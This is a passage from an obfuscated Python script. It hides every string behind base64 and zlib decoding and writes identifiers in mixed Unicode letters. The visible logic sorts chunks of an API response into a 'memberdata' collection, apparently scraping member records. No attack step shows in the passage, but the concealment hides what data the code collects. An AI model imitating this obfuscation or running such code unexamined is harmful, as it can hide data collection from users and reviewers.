0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__(𝘭𝗠𝗜𝘐𝗠𝙡𝗠𝗡𝙄𝗜𝘕𝘔𝘭𝘭𝙄𝗠𝘭𝙈𝘭𝘐𝙈𝘐𝙈𝗜𝗡𝘔𝗜𝗹𝘭𝙡𝘕𝘭[𝗿𝙤𝘂𝙣𝙙(𝘢𝙗𝘴(0.8100640593007004 + 0.5863413850559002j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJK\x0c\x0f\xb4\x05\x00\x1a\x14\x03\xfb')).decode()], __𝙞𝙢𝗽𝘰𝗿𝘁__(𝘭𝙈𝗜𝘐𝗠𝗹𝙈𝗡𝗜𝗜𝙉𝘔𝘭𝘭𝘐𝗠𝗹𝗠𝙡𝘐𝗠𝙄𝙈𝘐𝘕𝘔𝗜𝙡𝗹𝙡𝙉𝙡[𝙧𝘰𝘶𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝗿𝘵__(𝙡𝘔𝙄𝙄𝘔𝙡𝙈𝗡𝗜𝗜𝗡𝗠𝗹𝗹𝙄𝙈𝗹𝙈𝗹𝗜𝘔𝙄𝘔𝘐𝙉𝗠𝗜𝗹𝘭𝘭𝙉𝗹[𝙧𝙤𝘂𝙣𝙙(𝘢𝙗𝘀(0.15427302577952917 + 0.9880282554243217j))]).decompress(b'x\xdaKt\xb7,H6\x0e\xca\x89r\xb3\xacL2\xaa\xc8I.\xb7\xb5\x05\x00F;\x06\xc4')).decode(): 𝘳𝙚𝘀𝘱𝗼𝘯𝘀𝘦[__𝘪𝘮𝗽𝙤𝘳𝘁__(𝘭𝙈𝗜𝘐𝘔𝗹𝘔𝙉𝙄𝘐𝙉𝘔𝙡𝗹𝘐𝙈𝗹𝘔𝘭𝗜𝘔𝗜𝘔𝙄𝗡𝘔𝗜𝙡𝘭𝗹𝙉𝗹[𝙧𝘰𝘂𝙣𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__(𝙡𝙈𝙄𝘐𝙈𝘭𝗠𝗡𝗜𝘐𝙉𝙈𝘭𝘭𝘐𝗠𝗹𝘔𝙡𝘐𝗠𝙄𝙈𝘐𝗡𝘔𝗜𝙡𝙡𝗹𝘕𝘭[𝙧𝘰𝘂𝗻𝗱(𝘢𝗯𝘴(0.7073159047764657 + 0.7068975957309869j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝘪𝘮𝗽𝗼𝘳𝘵__(𝗹𝘔𝗜𝗜𝗠𝗹𝘔𝘕𝗜𝗜𝘕𝗠𝘭𝗹𝘐𝙈𝗹𝙈𝙡𝙄𝗠𝘐𝙈𝙄𝘕𝙈𝗜𝗹𝗹𝗹𝙉𝙡[𝙧𝗼𝘂𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝗿𝘵__(𝘭𝗠𝘐𝙄𝘔𝙡𝙈𝘕𝙄𝗜𝘕𝙈𝘭𝘭𝙄𝗠𝗹𝘔𝙡𝘐𝙈𝗜𝙈𝗜𝗡𝙈𝘐𝗹𝘭𝙡𝗡𝗹[𝙧𝗼𝘂𝙣𝙙(𝘢𝙗𝘴(0.6886638248499242 + 0.7250807791846872j))]).decompress(b'x\xda\x8b2\xf6*K\x89p\xaa\x02\x00\x0b\xdd\x02\xc6')).decode()], __𝘪𝘮𝗽𝗼𝘳𝙩__(𝙡𝙈𝗜𝗜𝘔𝘭𝘔𝗡𝙄𝗜𝗡𝙈𝗹𝗹𝗜𝗠𝙡𝗠𝘭𝗜𝗠𝙄𝙈𝘐𝙉𝗠𝗜𝘭𝙡𝙡𝘕𝙡[𝙧𝙤𝘶𝙣𝙙(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__(𝙡𝙈𝗜𝗜𝙈𝗹𝘔𝘕𝗜𝘐𝘕𝙈𝘭𝗹𝗜𝗠𝙡𝙈𝙡𝗜𝙈𝘐𝗠𝙄𝙉𝙈𝗜𝗹𝗹𝙡𝙉𝙡[𝗿𝙤𝙪𝗻𝙙(𝘢𝗯𝘴(0.3848969993578094 + 0.9229595331786515j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\x8a\xf0\xb5\x05\x00\rB\x02\xcc')).decode(): [], __𝘪𝗺𝙥𝙤𝘳𝙩__(𝙡𝙈𝗜𝙄𝘔𝘭𝗠𝗡𝘐𝘐𝘕𝘔𝘭𝘭𝘐𝗠𝙡𝗠𝙡𝗜𝗠𝗜𝘔𝗜𝗡𝙈𝗜𝘭𝗹𝙡𝗡𝘭[𝗿𝗼𝙪𝘯𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝘳𝘁__(𝙡𝗠𝘐𝘐𝗠𝙡𝗠𝗡𝘐𝙄𝘕𝘔𝙡𝘭𝘐𝙈𝘭𝗠𝗹𝗜𝗠𝙄𝘔𝙄𝗡𝘔𝗜𝘭𝙡𝙡𝙉𝘭[𝗿𝘰𝘂𝗻𝗱(𝘢𝗯𝙨(0.9686041693309138 + 0.24860805126699057j))]).decompress(b'x\xdaKr\xb7\xcc\x8a\x8c\x08*H22\xad\x02\x00\x19\xf3\x04\x03')).decode(): [], __𝙞𝙢𝗽𝗼𝗿𝙩__(𝙡𝗠𝗜𝙄𝙈𝗹𝘔𝙉𝗜𝘐𝙉𝙈𝘭𝗹𝗜𝘔𝘭𝗠𝙡𝗜𝗠𝗜𝘔𝘐𝘕𝘔𝙄𝙡𝙡𝗹𝙉𝘭[𝘳𝙤𝙪𝗻𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__(𝙡𝘔𝗜𝘐𝘔𝙡𝗠𝙉𝗜𝗜𝙉𝘔𝗹𝘭𝙄𝙈𝙡𝙈𝘭𝘐𝙈𝙄𝘔𝘐𝗡𝙈𝘐𝘭𝙡𝗹𝗡𝗹[𝗿𝙤𝘶𝗻𝙙(𝙖𝗯𝙨(0.4646878003646596 + 0.885474589241416j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode(): []}
        for 𝗰𝗵𝘂𝙣𝘬 in 𝗿𝗲𝘴𝙥𝗼𝘯𝘀𝙚[__𝘪𝘮𝙥𝙤𝘳𝘁__(𝙡𝘔𝙄𝙄𝙈𝘭𝙈𝘕𝙄𝘐𝙉𝗠𝙡𝗹𝗜𝙈𝗹𝘔𝘭𝘐𝘔𝘐𝗠𝗜𝙉𝗠𝙄𝙡𝗹𝗹𝙉𝘭[𝙧𝗼𝘂𝗻𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__(𝙡𝙈𝗜𝘐𝘔𝘭𝗠𝗡𝘐𝗜𝙉𝙈𝗹𝙡𝗜𝙈𝗹𝙈𝗹𝗜𝗠𝗜𝙈𝘐𝙉𝗠𝗜𝙡𝗹𝙡𝘕𝙡[𝘳𝘰𝘂𝙣𝙙(𝘢𝙗𝙨(0.9296678884432654 + 0.3683987204068986j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝘪𝗺𝙥𝗼𝘳𝘵__(𝗹𝗠𝗜𝙄𝗠𝙡𝘔𝘕𝙄𝙄𝙉𝗠𝘭𝗹𝙄𝗠𝙡𝙈𝗹𝗜𝘔𝘐𝙈𝙄𝙉𝘔𝙄𝙡𝙡𝙡𝗡𝘭[𝗿𝙤𝘶𝘯𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝘳𝙩__(𝘭𝘔𝗜𝙄𝙈𝗹𝙈𝗡𝗜𝙄𝙉𝗠𝘭𝘭𝗜𝙈𝙡𝘔𝙡𝙄𝗠𝗜𝙈𝘐𝙉𝗠𝙄𝗹𝘭𝗹𝙉𝘭[𝗿𝘰𝘶𝗻𝗱(𝙖𝗯𝘀(0.7543690354323014 + 0.6564505757335728j))]).decompress(b'x\xdaK2v\xaa\x02\x00\x03#\x01R')).decode()]:
            𝙢𝙚𝙢𝗯𝙚𝘳𝗱𝘢𝘁𝙖[__𝘪𝘮𝙥𝙤𝘳𝘁__(𝙡𝙈𝘐𝙄𝗠𝙡𝗠𝘕𝗜𝘐𝙉𝗠𝘭𝙡𝙄𝙈𝗹𝘔𝙡𝘐𝗠𝙄𝙈𝗜𝘕𝘔𝗜𝙡𝗹𝗹𝗡𝙡[𝘳𝙤𝘶𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝘳𝘵__(𝗹𝙈𝙄𝗜𝙈𝗹𝘔𝗡𝘐𝗜𝙉𝙈𝘭𝘭𝘐𝘔𝗹𝘔𝘭𝙄𝘔𝗜𝘔𝗜𝘕𝘔𝘐𝗹𝗹𝘭𝙉𝗹[𝗿𝘰𝘂𝙣𝙙(𝗮𝙗𝘴(0.5497131841070847 + 0.8353534672333924j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\x8a\xf0\xb5\x05\x00\rB\x02\xcc')).decode()].append(𝙘𝘩𝘶𝘯𝗸[__𝙞𝗺𝘱𝘰𝘳𝘵__(𝘭𝙈𝗜𝘐𝘔𝙡𝙈𝗡𝘐𝗜𝘕𝘔𝙡𝙡𝙄𝗠𝗹𝗠𝗹𝗜𝘔𝙄𝗠𝙄𝗡𝘔𝗜𝙡𝘭𝙡𝘕𝘭[𝗿𝘰𝘶𝗻𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝙧𝘁__(𝘭𝗠𝗜𝘐𝙈𝙡𝙈𝗡𝘐𝙄𝙉𝗠𝙡𝙡𝘐𝙈𝗹𝗠𝗹𝘐𝘔𝗜𝙈𝘐𝘕𝗠𝘐𝘭𝙡𝗹𝙉𝘭[𝙧𝗼𝘂𝙣𝗱(𝙖𝘣𝘴(0.23015111649050723 + 0.9731549021497929j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()])
            if 𝘤𝙝𝘶𝗻𝗸[__𝘪𝙢𝗽𝘰𝗿𝘁__(𝙡𝘔𝙄𝗜𝙈𝘭𝘔𝙉𝘐𝙄𝙉𝘔𝘭𝗹𝙄𝙈𝗹𝙈𝗹𝗜𝙈𝗜𝗠𝙄𝗡𝙈𝗜𝘭𝘭𝗹𝙉𝙡[𝘳𝗼𝘂𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__(𝙡𝘔𝘐𝘐𝘔𝘭𝙈𝙉𝙄𝘐𝗡𝙈𝙡𝗹𝗜𝗠𝗹𝗠𝘭𝗜𝘔𝗜𝗠𝙄𝘕𝗠𝙄𝗹𝙡𝙡𝗡𝗹[𝙧𝗼𝘶𝗻𝙙(𝗮𝘣𝘀(0.5737678212020608 + 0.81901800184919j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] in (__𝘪𝙢𝙥𝙤𝘳𝘵__(𝘭𝗠𝙄𝘐𝙈𝘭𝘔𝙉𝗜𝙄𝙉𝘔𝙡𝗹𝘐𝙈𝙡𝘔𝗹𝙄𝘔𝘐𝙈𝗜𝙉𝘔𝘐𝗹𝙡𝗹𝗡𝙡[𝗿𝙤𝙪𝗻𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝘰𝗿𝘁__(𝙡𝙈𝗜𝙄𝙈𝘭𝙈𝗡𝘐𝙄𝗡𝗠𝗹𝗹𝙄𝙈𝗹𝘔𝙡𝙄𝗠𝙄𝘔𝘐𝙉𝘔𝙄𝙡𝘭𝙡𝘕𝙡[𝙧𝙤𝘶𝗻𝘥(𝙖𝗯𝘴(0.7870703115455234 + 0.6168632949719351j))]).decompress(b'x\xda\x0b5\xcc\xf1\x0f,\xb7\xb5\x05\x00\x0bz\x02\x84')).decode(), __𝙞𝗺𝙥𝗼𝘳𝘵__(𝗹𝙈𝘐𝗜𝙈𝗹𝗠𝙉𝗜𝘐𝙉𝘔𝗹𝘭𝙄𝘔𝘭𝗠𝗹𝙄𝙈𝗜𝙈𝘐𝙉𝙈𝗜𝙡𝗹𝗹𝙉𝘭[𝘳𝘰𝘂𝗻𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__(𝘭𝗠𝘐𝙄𝘔𝙡𝘔𝙉𝗜𝙄𝙉𝙈𝘭𝗹𝙄𝘔𝘭𝗠𝗹𝘐𝘔𝙄𝗠𝘐𝗡𝘔𝗜𝗹𝗹𝗹𝙉𝗹[𝗿𝗼𝘶𝘯𝘥(𝗮𝘣𝘴(0.5771265046256875 + 0.8166547603844211j))]).decompress(b'x\xda\x0b\x0e5\r\x0f\x0c\xad\xf0\nru\x0b\r\n\xb4\xb5\x05\x00*\xfb\x04\xec')).decode()):
                𝙢𝘦𝗺𝗯𝗲𝘳𝗱𝙖𝙩𝘢[__𝙞𝗺𝗽𝘰𝗿𝘁__(𝗹𝘔𝘐𝙄𝗠𝙡𝘔𝙉𝘐𝙄𝗡𝗠𝙡𝗹𝘐𝗠𝙡𝙈𝙡𝙄𝙈𝘐𝗠𝘐𝗡𝙈𝙄𝘭𝗹𝗹𝘕𝘭[𝗿𝘰𝘶𝙣𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__(𝘭𝘔𝗜𝙄𝗠𝗹𝘔𝗡𝘐𝗜𝗡𝗠𝘭𝘭𝙄𝘔𝘭𝙈𝘭𝙄𝙈𝘐𝗠𝙄𝗡𝘔𝗜𝙡𝗹𝗹𝙉𝘭[𝗿𝗼𝘂𝘯𝗱(𝙖𝙗𝘴(0.05817910667160475 + 0.9983061612285552j))]).decompress(b'x\xdaKr\xb7\xcc\x8a\x8c\x08*H22\xad\x02\x00\x19\xf3\x04\x03')).decode()].append(𝘤𝘩𝘶𝙣𝘬[__𝘪𝙢𝘱𝘰𝙧𝙩__(𝙡𝗠𝙄𝙄𝙈𝙡𝗠𝙉𝙄𝙄𝙉𝗠𝘭𝗹𝗜𝘔𝘭𝗠𝙡𝗜𝙈𝗜𝘔𝘐𝗡𝘔𝘐𝗹𝘭𝙡𝘕𝙡[𝘳𝘰𝙪𝘯𝘥(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝙧𝘵__(𝗹𝗠𝙄𝘐𝗠𝗹𝗠𝙉𝗜𝗜𝙉𝙈𝗹𝗹𝙄𝗠𝙡𝘔𝘭𝙄𝘔𝙄𝙈𝘐𝗡𝘔𝙄𝘭𝙡𝗹𝗡𝘭[𝗿𝘰𝙪𝘯𝗱(𝗮𝗯𝙨(0.528287196058099 + 0.8490657444986646j))]).decompress(b'x\xdaK\xceu+\x8d2\n\xb5\x05\x00\x0c\xed\x02\xaa')).decode()])
                if 𝙘𝘩𝘂𝙣𝙠[__𝗶𝘮𝙥𝗼𝙧𝘵__(𝗹𝘔𝘐𝘐𝙈𝙡𝗠𝗡𝙄𝙄𝗡𝘔𝗹𝙡𝙄𝗠𝘭𝗠𝗹𝘐𝗠𝗜𝘔𝗜𝗡𝙈𝙄𝘭𝙡𝘭𝗡𝘭[𝘳𝗼𝙪𝙣𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__(𝙡𝘔𝗜𝘐𝙈𝗹𝙈𝙉𝘐𝙄𝗡𝘔𝙡𝘭𝙄𝘔𝘭𝗠𝘭𝙄𝙈𝙄𝙈𝘐𝘕𝙈𝗜𝙡𝗹𝘭𝙉𝙡[𝙧𝘰𝙪𝘯𝗱(𝙖𝗯𝘀(0.1916592757810961 + 0.9814615234470814j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] == __𝙞𝗺𝙥𝘰𝗿𝙩__(𝗹𝙈𝗜𝗜𝗠𝗹𝗠𝙉𝗜𝗜𝙉𝙈𝗹𝘭𝙄𝘔𝗹𝗠𝗹𝗜𝙈𝙄𝗠𝙄𝘕𝘔𝗜𝗹𝗹𝘭𝙉𝙡[𝘳𝘰𝙪𝙣𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__(𝘭𝙈𝗜𝙄𝘔𝙡𝘔𝙉𝘐𝗜𝙉𝘔𝘭𝙡𝘐𝙈𝘭𝗠𝙡𝘐𝘔𝘐𝙈𝗜𝘕𝙈𝘐𝗹𝗹𝗹𝗡𝙡[𝗿𝙤𝘶𝙣𝘥(𝙖𝘣𝙨(0.3281286572457678 + 0.9446330421354577j))]).decompress(b'x\xda\x0b5\xcc\xf1\x0f,\xb7\xb5\x05\x00\x0bz\x02\x84')).decode():
                    𝗺𝙚𝗺𝗯𝗲𝘳𝗱𝗮𝙩𝙖[__𝙞𝗺𝙥𝘰𝗿𝘵__(𝗹𝙈𝙄𝘐𝘔𝘭𝘔𝘕𝘐𝗜𝘕𝗠𝘭𝗹𝘐𝘔𝗹𝘔𝙡𝙄𝗠𝘐𝙈𝘐𝗡𝘔𝙄𝘭𝘭𝗹𝙉𝙡[𝘳𝘰𝘂𝙣𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__(𝘭𝗠𝗜𝙄𝘔𝙡𝘔𝙉𝗜𝗜𝘕𝙈𝗹𝗹𝗜𝘔𝙡𝙈𝙡𝙄𝙈𝘐𝘔𝗜𝗡𝗠𝙄𝗹𝙡𝗹𝗡𝙡[𝙧𝙤𝘂𝘯𝙙(𝙖𝘣𝙨(0.4746621323161375 + 0.8801680863023252j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()].append(𝙘𝘩𝘶𝙣𝗸[__𝘪𝙢𝘱𝘰𝘳𝘵__(𝗹𝗠𝘐𝘐𝙈𝗹𝘔𝗡𝘐𝗜𝘕𝘔𝗹𝘭𝘐𝘔𝗹𝙈𝗹𝘐𝘔𝗜𝙈𝗜𝘕𝙈𝘐𝘭𝗹𝙡𝘕𝗹[𝗿𝙤𝘂𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝗿𝙩__(𝘭𝙈𝘐𝙄𝗠𝘭𝗠𝙉𝗜𝙄𝘕𝗠𝘭𝘭𝙄𝙈𝙡𝙈𝙡𝗜𝘔𝘐𝙈𝙄𝙉𝗠𝗜𝘭𝗹𝙡𝘕𝘭[𝘳𝙤𝙪𝗻𝗱(𝙖𝘣𝘀(0.8350145251659905 + 0.5502279007482404j))]).decompress(b'x\xdaK\x8c\x08\xcaI\x8a\xf0\xb5\x05\x00\x0c\xe7\x02\xbc')).decode()])
                else:
                    𝙢𝗲𝙢𝘣𝙚𝘳𝘥𝗮𝘵𝗮[__𝗶𝘮𝗽𝗼𝗿𝘁__(𝘭𝘔𝘐𝙄𝙈𝘭𝙈𝗡𝗜𝙄𝘕𝙈𝘭𝘭𝘐𝙈𝙡𝗠𝘭𝙄𝗠𝗜𝙈𝙄𝗡𝘔𝙄𝗹𝗹𝗹𝗡𝘭[𝘳𝙤𝙪𝗻𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝘳𝙩__(𝙡𝗠𝘐𝗜𝗠𝗹𝘔𝗡𝗜𝘐𝙉𝗠𝘭𝗹𝗜𝘔𝗹𝗠𝗹𝙄𝗠𝙄𝗠𝙄𝙉𝘔𝙄𝗹𝗹𝙡𝗡𝗹[𝗿𝙤𝘂𝘯𝙙(𝘢𝗯𝙨(0.35022736642572616 + 0.9366647168579054j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()].append([])
            elif 𝙘𝘩𝙪𝗻𝙠[__𝘪𝙢𝘱𝘰𝗿𝘁__(𝗹𝙈𝗜𝙄𝘔𝘭𝙈𝙉𝗜𝙄𝘕𝘔𝙡𝙡𝙄𝗠𝙡𝗠𝗹𝘐𝘔𝘐𝘔𝗜𝘕𝘔𝗜𝗹𝘭𝗹𝘕𝙡[𝙧𝘰𝙪𝗻𝙙(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__(𝗹𝘔𝙄𝙄𝘔𝗹𝗠𝙉𝙄𝙄𝙉𝗠𝗹𝗹𝙄𝙈𝗹𝙈𝙡𝗜𝗠𝙄𝘔𝗜𝙉𝗠𝘐𝗹𝗹𝗹𝗡𝗹[𝗿𝗼𝘂𝙣𝘥(𝗮𝙗𝙨(0.5081067993505523 + 0.8612940731560491j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] in (__𝗶𝘮𝗽𝘰𝗿𝙩__(𝙡𝘔𝗜𝙄𝘔𝙡𝗠𝗡𝘐𝙄𝘕𝙈𝙡𝙡𝙄𝘔𝘭𝘔𝙡𝙄𝗠𝗜𝙈𝙄𝘕𝗠𝙄𝗹𝙡𝗹𝘕𝙡[𝘳𝙤𝙪𝘯𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝙧𝘵__(𝙡𝙈𝗜𝙄𝘔𝙡𝘔𝘕𝗜𝘐𝗡𝙈𝗹𝗹𝘐𝗠𝘭𝙈𝙡𝘐𝗠𝙄𝘔𝙄𝘕𝙈𝙄𝙡𝗹𝘭𝙉𝙡[𝗿𝘰𝘶𝙣𝗱(𝗮𝙗𝘴(0.5921108319703458 + 0.8058565397534384j))]).decompress(b'x\xda\x0b\x0e5\r\t\n\xf3\n\x05\x00\x0b\x08\x02y')).decode(), __𝘪𝘮𝘱𝗼𝘳𝙩__(𝘭𝙈𝗜𝙄𝙈𝘭𝗠𝙉𝘐𝗜𝙉𝙈𝗹𝗹𝗜𝙈𝙡𝙈𝗹𝘐𝙈𝙄𝘔𝙄𝗡𝗠𝘐𝗹𝙡𝗹𝘕𝙡[𝙧𝙤𝙪𝙣𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__(𝙡𝘔𝙄𝗜𝙈𝗹𝙈𝙉𝗜𝗜𝙉𝘔𝗹𝙡𝙄𝘔𝙡𝙈𝘭𝗜𝙈𝙄𝗠𝗜𝘕𝘔𝗜𝘭𝘭𝘭𝙉𝙡[𝙧𝗼𝘶𝗻𝗱(𝘢𝗯𝘴(0.7741597023288289 + 0.6329903279593923j))]).decompress(b"x\xda\x0b\x0bsr\r\x0c\x0br\x03\x00\x0b'\x02s")).decode(), __𝗶𝘮𝙥𝘰𝗿𝘁__(𝘭𝘔𝘐𝙄𝘔𝙡𝗠𝘕𝙄𝙄𝗡𝘔𝗹𝘭𝙄𝘔𝗹𝘔𝗹𝗜𝗠𝘐𝗠𝙄𝘕𝗠𝗜𝗹𝘭𝗹𝘕𝘭[𝘳𝗼𝘶𝙣𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘁__(𝙡𝘔𝙄𝘐𝗠𝘭𝘔𝙉𝙄𝗜𝙉𝗠𝗹𝗹𝗜𝗠𝘭𝙈𝘭𝘐𝘔𝘐𝗠𝗜𝘕𝗠𝗜𝗹𝘭𝗹𝙉𝘭[𝗿𝙤𝘂𝙣𝘥(𝙖𝘣𝘴(0.06519044553115072 + 0.99787284050196j))]).decompress(b'x\xda\x0br\r\xf3\r\n\x0br\x03\x00\x0b4\x02{')).decode()):
                𝗺𝘦𝙢𝗯𝗲𝘳𝘥𝗮𝙩𝘢[__𝙞𝘮𝗽𝙤𝗿𝘵__(𝙡𝘔𝗜𝙄𝘔𝗹𝘔𝘕𝗜𝘐𝘕𝘔𝗹𝗹𝘐𝙈𝗹𝗠𝘭𝗜𝙈𝗜𝘔𝘐𝗡𝗠𝙄𝙡𝘭𝘭𝙉𝙡[𝗿𝘰𝘂𝙣𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__(𝙡𝙈𝗜𝙄𝗠𝗹𝗠𝘕𝘐𝗜𝙉𝙈𝘭𝘭𝘐𝘔𝘭𝗠𝘭𝙄𝘔𝗜𝗠𝙄𝗡𝗠𝙄𝗹𝘭𝘭𝗡𝙡[𝘳𝘰𝙪𝙣𝗱(𝘢𝙗𝙨(0.7266560714176908 + 0.6870014220304116j))]).decompress(b'x\xdaKr\xb7\xcc\x8a\x8c\x08*H22\xad\x02\x00\x19\xf3\x04\x03')).decode()].append(𝙘𝘩𝙪𝘯𝙠[__𝗶𝙢𝘱𝗼𝗿𝘁__(𝘭𝘔𝘐𝘐𝗠𝗹𝙈𝙉𝘐𝗜𝘕𝙈𝙡𝙡𝘐𝘔𝙡𝘔𝗹𝘐𝙈𝙄𝘔𝘐𝘕𝘔𝗜𝙡𝘭𝗹𝙉𝗹[𝘳𝘰𝘂𝗻𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝙩__(𝙡𝘔𝗜𝘐𝘔𝗹𝙈𝗡𝙄𝗜𝙉𝘔𝘭𝘭𝘐𝘔𝙡𝘔𝙡𝘐𝘔𝘐𝙈𝙄𝙉𝘔𝘐𝙡𝙡𝙡𝗡𝗹[𝘳𝙤𝘂𝙣𝘥(𝘢𝘣𝙨(0.9701494910143553 + 0.24250765984724534j))]).decompress(b'x\xdaK\x0c7\xcd\x8e\x8aH\xb7\x05\x00\x0cA\x02\xaf')).decode()])
                if 𝗰𝗵𝘶𝘯𝗸[__𝙞𝗺𝗽𝗼𝙧𝙩__(𝘭𝘔𝘐𝘐𝙈𝗹𝗠𝙉𝙄𝘐𝗡𝙈𝘭𝗹𝗜𝘔𝗹𝘔𝙡𝗜𝘔𝙄𝙈𝙄𝙉𝗠𝘐𝗹𝗹𝗹𝙉𝙡[𝙧𝗼𝘂𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝘳𝘵__(𝘭𝗠𝘐𝗜𝗠𝗹𝘔𝘕𝗜𝗜𝗡𝙈𝙡𝙡𝗜𝘔𝗹𝗠𝗹𝗜𝗠𝗜𝗠𝗜𝗡𝙈𝘐𝙡𝙡𝘭𝙉𝙡[𝗿𝙤𝙪𝗻𝘥(𝘢𝙗𝘴(0.31271903381452937 + 0.9498456747757013j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] == __𝘪𝙢𝗽𝙤𝙧𝘁__(𝗹𝙈𝘐𝙄𝙈𝘭𝘔𝘕𝘐𝙄𝗡𝙈𝗹𝘭𝘐𝘔𝗹𝙈𝗹𝘐𝗠𝗜𝘔𝗜𝙉𝙈𝗜𝗹𝙡𝘭𝗡𝘭[𝙧𝗼𝘂𝙣𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝙧𝘁__(𝗹𝘔𝘐𝗜𝗠𝙡𝗠𝘕𝘐𝙄𝙉𝙈𝘭𝘭𝘐𝘔𝗹𝙈𝗹𝘐𝗠𝙄𝘔𝗜𝘕𝘔𝙄𝙡𝘭𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝘥(𝘢𝙗𝙨(0.5045290471648863 + 0.8633947188666907j))]).decompress(b'x\xda\x0br\r\xf3\r\n\x0br\x03\x00\x0b4\x02{')).decode():
                    𝙢𝘦𝗺𝙗𝘦𝙧𝙙𝗮𝘁𝙖[__𝙞𝘮𝙥𝘰𝙧𝘵__(𝗹𝘔𝗜𝘐𝙈𝘭𝘔𝙉𝙄𝙄𝗡𝘔𝙡𝘭𝘐𝘔𝗹𝗠𝙡𝗜𝗠𝙄𝙈𝗜𝙉𝗠𝘐𝙡𝙡𝘭𝘕𝗹[𝗿𝙤𝙪𝘯𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝙤𝙧𝙩__(𝗹𝙈𝘐𝘐𝗠𝙡𝗠𝙉𝘐𝗜𝙉𝙈𝗹𝗹𝗜𝙈𝙡𝙈𝙡𝙄𝗠𝙄𝗠𝙄𝗡𝘔𝗜𝘭𝙡𝙡𝗡𝘭[𝙧𝙤𝘂𝘯𝙙(𝘢𝙗𝘀(0.04604530002417684 + 0.9989393526864799j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()].append([])
                else:
